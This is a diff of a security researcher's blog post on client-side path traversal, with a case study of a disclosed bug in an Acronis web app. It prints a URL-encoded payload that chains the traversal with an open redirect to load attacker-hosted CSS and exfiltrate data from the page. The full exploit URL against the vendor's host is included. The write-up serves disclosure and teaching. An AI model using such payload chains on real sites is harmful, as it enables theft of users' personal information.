@@ -3,11 +3,23 @@ layout: post
 title:  "Practical Client Side Path Traversal Attacks"
 date:   2022-11-04 15:36:24 +0200
 categories: Research
+description: Exploring how modern web-applications can be exploited by placing user input into the path of client-side requests and showing a clear pathway to exploit it. Addionally, I explain a case study in Acronis program.
 ---
 
-[Check my report in HackerOne for more details and a video PoC][report]
 
-<h1 class="title-report">../../../../:)</h1>
+<div class="col-lg-3 col-sm-6 mb-30 pb-2">
+    <div class="team-card-style-3 mx-auto">
+      <h4 class="team-name">
+      <a clas="author" href="https://twitter.com/medi_0ne">
+        By Medi
+      </a></h4>
+  </div>
+</div>
+
+
+[Check my report in HackerOne for more details][report]
+
+<h1 class="title-report responsive-font">../../../:)</h1>
 
 ## Introduction
 
@@ -174,26 +186,49 @@ We know that when we load any CSS file it follows all the redirects specified in
 
 By putting together these two tricks let's say the `color_sheme` GET parameter have the following value:
 
-`%2F..%2F..%2F..%2Fapi%2F2%2Fidp%2Fauthorize%2F%3Fclient_id%3Dfb2bf44e-ac14-444a-b2a9-e5e81fe73b80%26redirect_uri%3D%252Fhci%252Fcallback%26response_type%3Dcode%26scope%3Dopenid%26state%3Dhttp%253A%252F%252Flocalhost%252Fcss%252Fcore.css%26nonce%3Dbhgjuvrrvpwauibleqhvfqat`
-
+<div class="aside">
+  <pre class="prettyprint prettyprinted" style="color:#c7254e">
+    %2F..%2F..%2F..%2Fapi%2F2%2Fidp%2Fauthorize%2F%3Fclient_id%3D
+    fb2bf44e-ac14-444a-b2a9-e5e81fe73b80%26redirect_uri%3D
+    %252Fhci%252Fcallback%26response_type%3Dcode%26
+    scope%3Dopenid%26state%3Dhttp%253A%252F%252Flocalhost%252Fcss%252Fcore.css%26
+    nonce%3Dbhgjuvrrvpwauibleqhvfqat
+  </pre>
+</div>
 In order to work the exploit the parameters needs to be URL encoded. Let's decode the parameter to a better understanding:
 
-`/../../../api/2/idp/authorize/?client_id={CLIENT-ID}&redirect_uri=%2Fhci%2Fcallback&response_type=code&scope=openid&state=http%3A%2F%2Flocalhost%2Fcss%2Fcore.css&nonce=bhgjuvrrvpwauibleqhvfqat`
+<div class="aside">
+  <pre class="prettyprint prettyprinted" style="color:#c7254e">
+    /../../../api/2/idp/authorize/?client_id={CLIENT-ID}&
+    redirect_uri=%2Fhci%2Fcallback&response_type=code&scope=openid
+    &state=http%3A%2F%2Flocalhost%2Fcss%2Fcore.css&nonce=bhgjuvrrvpwauibleqhvfqat
+  </pre>
+</div>
 
 You will notice that the first thing we do in the previous payload is **Overwrite the Relative Path** to the root directory of the app. Then, we specify the endpoint vulnerable to the Open redirect and in this vulnerable endpoint redirect the user to `http://localhost/core/css.css` where is in my case the CSS file stored used to exfiltrate the user personal information.
 
 As a result, the browser will load my CSS and we can exfiltrate personal data about the user.
 
 The **final URL** to load the external CSS will looks like this:
-`https://mc-beta-cloud.acronis.com/mc/?color_sheme=%2F..%2F..%2F..%2Fapi%2F2%2Fidp%2Fauthorize%2F%3Fclient_id%3Dfb2bf44e-ac14-444a-b2a9-e5e81fe73b80%26redirect_uri%3D%252Fhci%252Fcallback%26response_type%3Dcode%26scope%3Dopenid%26state%3Dhttp%253A%252F%252Flocalhost%252Fcss%252Fcore.css%26nonce%3Dbhgjuvrrvpwauibleqhvfqat`
+
+<div class="aside">
+  <pre class="prettyprint prettyprinted" style="color:#c7254e">
+  https://mc-beta-cloud.acronis.com/mc/?color_sheme=%2F..%2F..%2F..%2F
+  api%2F2%2Fidp%2Fauthorize%2F%3Fclient_id%3Dfb2bf44e-ac14-444a-b2a9-e5e81fe73b80
+  %26redirect_uri%3D%252Fhci%252Fcallback%26response_type%3D
+  code%26scope%3Dopenid%26state%3Dhttp%253A%252F%252Flocalhost%252Fcss%252Fcore.css
+  %26nonce%3Dbhgjuvrrvpwauibleqhvfqat
+</pre>
+</div>
 Make sure you correctly URL encode it.
 
 ![Logo image](https://mr-medi.github.io/assets/img/css.png)
 
-Excellent, we successfully injected the CSS file from our remote server leading to exfiltrate personal information found in the DOM via CSS properties. In the next video you can see the full PoC as well:
+Excellent, we successfully injected the CSS file from our remote server leading to exfiltrate all the information found in the DOM via CSS properties.In the next video you can see the full PoC as well:
 
+<div class="embed-responsive embed-responsive-16by9">
 <iframe width="560" height="315" src="https://www.youtube.com/embed/srPv75HS6Nk" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
-
+</div>
 
 ## Final Thoughts
 
@@ -202,10 +237,10 @@ It's not a new technique but definitely it's worthy to explore and very cool to 
 
 **I will share and update this post with more examples of how to approach this attack as soon as disclose more reports of this kind.**
 
-The cool thing is that each web application have different behaviours about how they handle it in the javascript, so the impact and type of bug may depend about how do they use it.
+The cool thing is that each web application have different behaviours about how they handle it in the javascript, so the impact and type of bug may depend about how do they use it and the pourpose of the affected parameter.
 
 I'm sure this technique can be chained with **Relative Path Overwrite Attacks** in websites without the
-**DOCTYPE** declaration. In the next link you can read an awesome writeup by the magnific **James Kettle**
+**DOCTYPE** declaration. In the next link you can read an awesome writeup by the magnific [**James Kettle**][james_kettle]
 [https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities][writeup]
 
 Feel free to let me know if you have any suggestion or questions about this and I will be glad to hear it.
@@ -234,3 +269,4 @@ to exfiltrate information. In the next links you have some useful info and some 
 [r1]:https://www.google.com/search?q=css+injection
 [r2]:https://www.google.com/search?q=site%3Ahackerone.com+css+injection
 [r3]:https://www.google.com/search?q=css+injection+exfiltration
+[james_kettle]:https://twitter.com/albinowax
